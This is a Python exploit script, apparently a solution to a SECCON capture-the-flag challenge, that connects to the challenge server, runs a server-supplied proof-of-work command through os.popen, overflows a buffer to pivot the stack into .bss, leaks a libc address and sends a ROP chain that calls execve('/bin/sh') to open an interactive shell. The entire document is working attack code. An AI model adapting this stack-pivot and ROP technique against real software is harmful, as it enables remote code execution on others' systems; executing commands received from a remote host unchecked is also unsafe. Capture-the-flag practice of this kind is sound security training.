#!/usr/bin/env python3

from ptrlib import *
elf = ELF('./chall')
libc = ELF('./libc.so.6')

io = remote('mrga.seccon.games', 7428)

import os

io.recvline()
result = os.popen(io.recvline().decode()).read().strip()
io.sendlineafter(": ", result)

io.recvline()
payload = b"A" * 0x10
payload += p64(elf.section(".bss") + 0x200)
payload += p64(elf.symbol("main") + 0x11)
io.sendline(payload)

payload = b"A" * 0x10
payload += p64(elf.section(".bss") + 0x240)
payload += p64(elf.symbol("main"))
payload += p64(elf.symbol("main") + 24)
payload += p64(0x0) * 5
payload += p64(elf.section(".bss") + 0x258)
payload += p64(elf.symbol("main"))
payload += p64(elf.symbol("main") + 24)
payload += p64(0x0)
payload += p64(elf.symbol("show_prompt") + 0xd)
payload += p64(elf.section(".bss") + 0x280)
payload += p64(elf.symbol("main"))

io.sendline(payload)
io.sendline("k")
io.sendline(p32(0) + b"A" * 4 + b"B" * 8)
io.sendline("k")
io.sendline("CCCC")
io.recvuntil(b"CCCC")
io.recv(4)
libc.base = u64(io.recvline()) + 0x28c0
print("[+] libc addr is " + hex(libc.base))
payload2 = p64(0x0) * 3
payload2 += p64(next(libc.gadget("pop rbp; ret;")))
payload2 += p64(0x4042a0)
payload2 += p64(next(libc.gadget("pop rdx; leave; ret;")))
payload2 += p64(0x0)
payload2 += p64(next(libc.gadget("pop rsi; ret;")))
payload2 += p64(0x0)
payload2 += p64(next(libc.gadget("pop rdi; ret;")))
payload2 += p64(next(libc.find(b"/bin/sh\x00")))
payload2 += p64(next(libc.gadget("pop rax; ret;")))
payload2 += p64(59)
payload2 += p64(next(libc.gadget("syscall")))
io.sendline(payload2)

io.interactive()
